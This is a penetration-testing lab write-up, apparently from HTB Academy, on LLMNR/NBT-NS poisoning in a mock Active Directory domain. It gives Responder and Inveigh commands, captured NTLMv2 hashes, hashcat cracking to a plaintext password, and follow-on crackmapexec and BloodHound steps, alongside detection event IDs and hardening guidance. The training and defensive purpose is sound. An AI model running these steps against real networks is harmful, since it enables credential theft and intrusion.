# 01 — LLMNR / NBT-NS Poisoning

> **Lab Environment:** INLANEFREIGHT.LOCAL · Attack host: Pwnbox (Parrot OS) · Interface: `ens224` · Domain: `172.16.5.0/23` · DC: `172.16.5.5`
>
> **Platform vector:** Linux (Responder) → Windows (Inveigh)

---

## Table of Contents

1. [Root Cause](#1-root-cause)
2. [How the Protocol Fallback Works](#2-how-the-protocol-fallback-works)
3. [Attack Chain Overview](#3-attack-chain-overview)
4. [Lab Environment](#4-lab-environment)
5. [Phase 1 — Passive Recon with Responder](#5-phase-1--passive-recon-with-responder)
6. [Phase 2 — Active Poisoning (Linux)](#6-phase-2--active-poisoning-linux)
7. [Phase 3 — Cracking the NTLMv2 Hash](#7-phase-3--cracking-the-ntlmv2-hash)
8. [Phase 4 — Poisoning from Windows (Inveigh)](#8-phase-4--poisoning-from-windows-inveigh)
9. [What To Do with the Credential](#9-what-to-do-with-the-credential)
10. [Detection & Telemetry](#10-detection--telemetry)
11. [Hardening](#11-hardening)
12. [MITRE ATT&CK Mapping](#12-mitre-attck-mapping)
13. [References](#13-references)

---

## 1. Root Cause

Windows environments support two legacy name-resolution protocols as fallback mechanisms when DNS fails to resolve a hostname:

| Protocol | Full Name | Transport | Port |
|---|---|---|---|
| **LLMNR** | Link-Local Multicast Name Resolution | UDP multicast | 5355 |
| **NBT-NS** | NetBIOS Name Service | UDP broadcast | 137 |
| **mDNS** | Multicast DNS (supplementary) | UDP multicast | 5353 |

The fundamental flaw: **when a host broadcasts an LLMNR or NBT-NS query asking "who is `FILESERVER01`?", any host on the same Layer 2 segment can answer**. There is no authentication of the responder. A malicious host that answers first can redirect the victim to an attacker-controlled service and harvest the NTLM authentication challenge-response — the NTLMv2 hash — when the victim attempts to authenticate.

This is not a software vulnerability. It is a **protocol design flaw** that is enabled by default in every Windows version up to and including Windows 11 and Windows Server 2022. It costs nothing to exploit from a standard network-connected attacker position.

---

## 2. How the Protocol Fallback Works

```
Victim Host (172.16.5.125) tries to resolve "\\FILESERVER01"

  Step 1: DNS query  → DNS Server (172.16.5.5)
                     ← NXDOMAIN (not found)

  Step 2: LLMNR multicast broadcast
          "Who is FILESERVER01?" → all hosts on subnet

  Step 3: Attacker (Responder) sees broadcast
          "I am FILESERVER01!" → victim

  Step 4: Victim believes the response, initiates authentication
          SMB/HTTP connection with NTLMv2 challenge-response

  Step 5: Attacker captures NTLMv2 hash
          Victim: FOREND::INLANEFREIGHT → hash captured
```

The victim never reaches a real server. The credential exchange happens entirely with the attacker's machine. The resulting hash is a **NetNTLMv2 challenge-response** — it cannot be used directly for pass-the-hash but can be cracked offline or relayed to another service.

---

## 3. Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    LLMNR/NBT-NS Poisoning Chain                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  VICTIM (172.16.5.125)         ATTACKER (Pwnbox / ens224)          │
│                                                                     │
│  DNS lookup fails          →   Listening: Responder -I ens224       │
│  LLMNR broadcast sent      →   Responder poisons response           │
│  Victim authenticates      →   NTLMv2 hash captured to log file     │
│                                                                     │
│  CAPTURED HASH:                                                     │
│  FOREND::INLANEFREIGHT:4af70a79...                                 │
│                                                                     │
│  OFFLINE CRACKING:                                                  │
│  hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt             │
│           ↓                                                         │
│  Klmcargo2  (plaintext recovered)                                   │
│                                                                     │
│  FOOTHOLD:                                                          │
│  Domain user FOREND:Klmcargo2 → enumerate, spray, escalate         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**Attack pre-requisites:**
- Network access on the same Layer 2 segment (or VLAN)
- Target must generate failed name resolution (misconfigured share paths, typos, old GPO references, etc.)
- No requirement for elevated privileges on the attack host at the network level

---

## 4. Lab Environment

| Component | Detail |
|---|---|
| Domain | `INLANEFREIGHT.LOCAL` |
| Domain Controller | `172.16.5.5` (MS01) |
| Attack host | Pwnbox — Parrot OS |
| Attack interface | `ens224` (internal network) |
| IP range | `172.16.5.0/23` |
| Primary victim | `172.16.5.125` (ACADEMY-EA-MS01) |
| Victim user captured | `FOREND` |

---

## 5. Phase 1 — Passive Recon with Responder

Before poisoning anything, run Responder in **Analysis mode** (`-A`). This listens and logs all LLMNR/NBT-NS/mDNS traffic without sending any poisoned replies. Zero network footprint, no authentication coercion, nothing to alert on.

This tells you:
- Which hosts are broadcasting name queries (misconfigured, stale GPOs, broken UNC paths)
- Which protocols are active (LLMNR vs NBT-NS vs mDNS)
- Whether this attack vector is viable before you go active

### Start passive analysis

```bash
Hackerpatel007_1@htb[/htb]$ sudo responder -I ens224 -A
```

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoning Options:
    Analyze Mode             [ON]
    Force WPAD auth          [OFF]
    Force Basic Auth         [OFF]
    Force LM downgrade       [OFF]
    Fingerprint hosts        [OFF]

[+] Generic Options:
    Responder NIC            [ens224]
    Responder IP             [172.16.5.2]
    Challenge set            [random]
    Don't Respond To Names   ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name   [WIN-2TY1Z1CIGXH]
    Responder Domain Name    [HF2L.LOCAL]
    Responder DCE-RPC Port   [47904]

[+] Listening for events...

[Analyze mode: LLMNR] Request by 172.16.5.125 for academy-ea-web0, ignoring
[Analyze mode: NBT-NS] Request by 172.16.5.125 for ACADEMY-EA-WEB0, ignoring
[Analyze mode: LLMNR] Request by 172.16.5.200 for wpad, ignoring
```

**What this output tells you:**

| Field | Meaning |
|---|---|
| `172.16.5.125` | A host is sending LLMNR broadcasts — it has unresolved names |
| `academy-ea-web0` | The name being queried — something is pointing to it that no longer exists |
| `wpad` | Auto-proxy discovery traffic — common in corporate envs, exploitable via WPAD |
| `Analyze mode: LLMNR` | Responder is listening but NOT responding — zero footprint |

> **Operator note:** Let this run for 10–15 minutes during initial enum. The pattern of queries reveals misconfigurations: stale drive mappings, old printer UNC paths, broken scripts. These are the conditions that make active poisoning highly effective.

---

## 6. Phase 2 — Active Poisoning (Linux)

Once passive recon confirms active LLMNR traffic, enable full poisoning. Responder will now respond to every LLMNR/NBT-NS/mDNS query it sees and coerce authentication to its rogue SMB/HTTP/FTP services.

> **Note:** This is active and will be visible in network captures and security tooling. Run it in a tmux session and let it collect hashes while you perform other enumeration in parallel.

### Start Responder with default settings

```bash
Hackerpatel007_1@htb[/htb]$ sudo responder -I ens224
```

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoning Options:
    Analyze Mode             [OFF]
    Force WPAD auth          [OFF]
    Force Basic Auth         [OFF]
    Force LM downgrade       [OFF]
    Fingerprint hosts        [OFF]

[+] Generic Options:
    Responder NIC            [ens224]
    Responder IP             [172.16.5.2]
    Challenge set            [random]
    Don't Respond To Names   ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name   [WIN-2TY1Z1CIGXH]
    Responder Domain Name    [HF2L.LOCAL]
    Responder DCE-RPC Port   [47904]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 172.16.5.125
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\FOREND
[SMB] NTLMv2-SSP Hash     : FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f04780000000002000800490034004600 4e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e00490034004600 4e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000
```

**Breaking down the captured hash line:**

```
FOREND::INLANEFREIGHT:<challenge>:<NT response>:<blob>
  │        │               │             │
  │        │               │             └─ Full NTLM authentication blob
  │        │               └─ 8-byte server challenge (from rogue Responder)
  │        └─ Domain name (NETBIOS format)
  └─ Username of authenticating account
```

> The hash format is **NetNTLMv2** (also called NTLMv2-SSP). It is a challenge-response exchange, not a reusable NT hash. You cannot use it directly for pass-the-hash. It must be cracked offline or relayed (see technique 02).

### Where Responder stores captured hashes

```bash
Hackerpatel007_1@htb[/htb]$ ls /usr/share/responder/logs/
```

```
Analyzer-Session.log                 Responder-Session.log
Config-Responder.log                 SMB-NTLMv2-SSP-172.16.5.125.txt
                                     SMB-NTLMv2-SSP-172.16.5.200.txt
```

Responder creates one log file per source IP. Each `.txt` file contains only the hashes from that host — convenient for targeted cracking.

```bash
Hackerpatel007_1@htb[/htb]$ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.125.txt
```

```
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:0101000...
```

> **Professional practice:** Copy hash files off the attack host immediately. If Responder is killed or the session dies, the SQLite database (`/usr/share/responder/Responder.db`) retains all captured hashes for the session and can be queried later.

---

## 7. Phase 3 — Cracking the NTLMv2 Hash

NTLMv2 hashes are **hashcat mode 5600**. They are computationally expensive compared to NTLM (mode 1000), so a GPU rig produces significantly faster results than CPU-only cracking.

### Save the hash to a working file

```bash
Hackerpatel007_1@htb[/htb]$ cp /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.125.txt ~/forend_ntlmv2.txt
```

### Crack with rockyou.txt

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 5600 ~/forend_ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

```
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
* Device #1: pthread-Intel(R) Core(TM) i7-5820K CPU @ 3.30GHz, 1438/2877 MiB (512 MiB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:0101000...
                                                                            :Klmcargo2

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue.......: 1/1 (100.00%)
Speed.#1.........:     1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10967040/14344385 (76.46%)
Rejected.........: 0/10967040 (0.00%)
Restore.Point....: 10960896/14344385 (76.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: L0VEABLE -> Kittikat

Started: Mon Feb 28 15:20:29 2022
Stopped: Mon Feb 28 15:20:42 2022
```

**Result:** `FOREND:Klmcargo2`

> The hash cracked in **11 seconds** against rockyou.txt. `Klmcargo2` is an 8-character mixed-case alphanumeric password. This confirms the domain has a weak password policy — a common finding in mid-size enterprise environments where the minimum is 8 characters and complexity is loosely enforced.

### Show only the cracked result

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 5600 ~/forend_ntlmv2.txt /usr/share/wordlists/rockyou.txt --show
```

```
FOREND::INLANEFREIGHT:4af70a79938ddf8a:...:Klmcargo2
```

**Captured credential summary:**

| Field | Value |
|---|---|
| Domain | `INLANEFREIGHT` |
| Username | `FOREND` |
| Password | `Klmcargo2` |
| Hash type | NetNTLMv2 (mode 5600) |
| Cracked in | 11 seconds (CPU, rockyou.txt) |

---

## 8. Phase 4 — Poisoning from Windows (Inveigh)

If the attack position is a Windows host (compromised workstation, Windows jump server, or Windows-based engagement scope), **Inveigh** replicates Responder's capability. It is a PowerShell/C# tool that listens on LLMNR, NBT-NS, mDNS, DHCPv6, and multiple other protocols.

> **When you'd use Inveigh:** Landed on a Windows host as local admin via another attack path. Need to harvest hashes without transferring Linux tooling. Or the client explicitly provided a Windows attack box.

### Method A — PowerShell (Inveigh.ps1)

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```
[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834
```

### Method B — C# (InveighZero / Inveigh.exe)

The C# version is actively maintained and is the preferred method. It uses an interactive console accessible via `ESC`.

```powershell
PS C:\htb> .\Inveigh.exe
```

```
[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[+] LLMNR Packet Sniffer [Type A]
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[*] Press ESC to enter/exit interactive console
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
```

### Retrieve captured hashes from the interactive console

Press `ESC` to drop into the Inveigh console while it is running, then:

```
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> GET NTLMV2UNIQUE
```

```
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:0101000...
backupagent::INLANEFREIGHT:c3cc12a71de91734:7de5e1dfc1849dc...
svc_qualys::INLANEFREIGHT:b56a4c0c7bab4c72:00f1bb85d9f4d...
```

```
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> GET NTLMV2USERNAMES
```

```
172.16.5.125    INLANEFREIGHT\FOREND
172.16.5.200    INLANEFREIGHT\backupagent
172.16.5.150    INLANEFREIGHT\svc_qualys
```

> **Console status indicator:** `NTLMv2(3:9)` means 3 unique hashes, 9 total captures (some users authenticated multiple times). Use `GET NTLMV2UNIQUE` to get one hash per user — no need to crack the same password twice.

---

## 9. What To Do with the Credential

Cracking LLMNR-captured hashes is not the end goal — it is the beginning of enumeration. With `FOREND:Klmcargo2`:

```
LLMNR Capture → Cracked Hash → Domain User Credential
                                      ↓
                 ┌─────────────────────────────────┐
                 │  Next Attack Paths               │
                 ├─────────────────────────────────┤
                 │  BloodHound enumeration          │
                 │  LDAP enumeration (ldapdomaindump)│
                 │  SMB share enumeration (CME)      │
                 │  Kerberoasting (GetUserSPNs.py)   │
                 │  AS-REP Roasting                  │
                 │  Password spraying for other users│
                 │  ACL/DACL abuse research          │
                 └─────────────────────────────────┘
```

**Validate the credential immediately:**

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u FOREND -p Klmcargo2
```

```
SMB   172.16.5.5  445  ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB   172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\FOREND:Klmcargo2
```

**Run BloodHound collection immediately:**

```bash
Hackerpatel007_1@htb[/htb]$ bloodhound-python -u FOREND -p Klmcargo2 -d INLANEFREIGHT.LOCAL -ns 172.16.5.5 -c All
```

> **Timing matters:** Hashes and credentials captured during an assessment window must be acted on while the engagement is active. The hash is a snapshot of the password at capture time — if the user rotates before you crack it, it's useless.

---

## 10. Detection & Telemetry

### Network-level indicators

| Indicator | Description |
|---|---|
| Rogue SMB service | A host answering LLMNR queries that is not the legitimate resource |
| Unusual NTLM auth to random IPs | Hosts authenticating to unexpected machines (the attacker's IP) |
| LLMNR/NBT-NS broadcast volume | Sudden spike in fallback protocol traffic during active poisoning |
| Duplicate responder to LLMNR query | Multiple hosts responding to the same LLMNR broadcast |

### Windows Event Log — key Event IDs

| Event ID | Log | Trigger |
|---|---|---|
| **4648** | Security | Explicit credential use — victim authenticating to unknown host |
| **4624** | Security | Logon success — attacker's rogue SMB server logging authentication |
| **4625** | Security | Logon failure — victim fails auth against rogue SMB |
| **4776** | Security | NTLM authentication attempted (domain controller) |
| **5156** | Security | Windows Filtering Platform — connection allowed (victim to attacker IP) |
| **3** | Sysmon | Network connection — victim host to attacker IP on port 445 |

### Sysmon detection (LLMNR via Wireshark / PCAP)

Network SOC signature: Look for **LLMNR traffic (UDP/5355)** where the responder is not the DNS server. Any IP other than the authorised DNS resolver responding to an LLMNR query is suspicious.

> An LLMNR responder that is NOT the domain controller or DNS server responding to LLMNR queries is an immediate flag for investigation.

---

## 11. Hardening

The most effective countermeasure is **disabling LLMNR and NBT-NS entirely** via Group Policy. If nothing depends on them, disabling costs zero functionality and eliminates this attack surface permanently.

### Disable LLMNR via GPO

```
Computer Configuration
  → Administrative Templates
    → Network
      → DNS Client
        → "Turn OFF Multicast Name Resolution"
          → Set to: Enabled
```

### Disable NBT-NS via Registry (PowerShell — deploy via GPO or SCCM)

```powershell
# Disable NBT-NS on all adapters
$adapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = TRUE"
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)  # 2 = Disable NetBIOS over TCP/IP
}
```

### Disable NBT-NS via Registry (manual path per adapter)

```
HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\Tcpip_{GUID}
  Value: NetbiosOptions
  Data:  2  (0 = default from DHCP, 1 = enabled, 2 = disabled)
```

### Additional hardening controls

| Control | Mitigates |
|---|---|
| Enable DNS over HTTPS (DoH) / DNS signing (DNSSEC) | Reduces reliance on fallback protocols |
| Network segmentation (VLAN isolation) | Limits Layer 2 visibility between workstations |
| 802.1X port-based NAC | Prevents rogue hosts on the network |
| SMB signing enforcement | Prevents NTLMv2 relay attacks (see technique 02) |
| NTLM restriction via GPO | Limits NTLM usage, forces Kerberos |
| IDS/IPS rule for LLMNR responder anomaly | Detects active poisoning in progress |

> **If LLMNR/NBT-NS cannot be disabled** (legacy applications, operational constraints): implement network-level monitoring to alert on unexpected LLMNR responders, and ensure SMB signing is enforced to prevent relay even if hashes are captured.

---

## 12. MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Adversary-in-the-Middle | [T1557](https://attack.mitre.org/techniques/T1557/) | General AiTM classification |
| LLMNR/NBT-NS Poisoning and SMB Relay | [T1557.001](https://attack.mitre.org/techniques/T1557/001/) | Specific sub-technique for this attack |
| OS Credential Dumping: NTDS | [T1003.003](https://attack.mitre.org/techniques/T1003/003/) | Downstream use of captured credential |
| Valid Accounts: Domain Accounts | [T1078.002](https://attack.mitre.org/techniques/T1078/002/) | Using cracked credential for access |
| Brute Force: Password Cracking | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) | Offline cracking of captured NTLMv2 hash |

**Tactic:** Credential Access · Initial Access · Lateral Movement

---

## 13. References

| Resource | URL |
|---|---|
| Responder GitHub | https://github.com/lgandx/Responder |
| Inveigh GitHub (PowerShell) | https://github.com/Kevin-Robertson/Inveigh |
| Inveigh GitHub (C#) | https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh |
| MITRE T1557.001 | https://attack.mitre.org/techniques/T1557/001/ |
| Hashcat Hash Examples | https://hashcat.net/wiki/doku.php?id=example_hashes |
| Microsoft — Disable LLMNR | https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/disabling-llmnr/ba-p/258230 |
| HTB Academy — AD Enumeration & Attacks | https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks |

---

*Documented from INLANEFREIGHT.LOCAL lab environment — HTB Academy Active Directory Penetration Tester Path 2024.*
